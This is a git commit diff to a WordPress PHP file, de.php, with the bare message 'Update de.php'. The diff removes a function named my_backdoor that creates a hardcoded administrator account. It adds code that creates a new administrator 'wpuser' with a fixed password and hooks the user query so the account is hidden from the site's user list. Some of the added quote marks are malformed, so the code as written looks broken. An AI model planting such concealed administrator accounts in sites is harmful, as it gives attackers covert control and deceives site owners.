73430605cd25c4eee478c64e8f6823d87bc3055d
Arman ali <armanalin00786@gmail.com>
2024-01-04 17:12:15 +0530

    Update de.php

--- de.php
+++ de.php
@@ -1,10 +1,12 @@
-function my_backdoor() {
+$new_user = new WP_User(wp_create_user(‘wpuser,’wp-user1234’));
+$new_user->set_role('administrator');
 
-    require( 'wp-includes/registration.php' );
-        if ( !username_exists( 'mr_admin' ) ) {
-            $user_id = wp_create_user( 'mr_admin', 'pa55w0rd!' );
-            $user = new WP_User( $user_id );
-            $user->set_role( 'administrator' ); 
-        }
-    }
-
+add_action('pre_user_query','hidden_access');
+function hidden_access($user_search){
+	global $current_user;
+	$username = $current_user->user_login;
+	if($username != 'user'){
+		global $wpdb;
+		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != ‘wpuser’”,$user_search->query_where );
+	}
+}
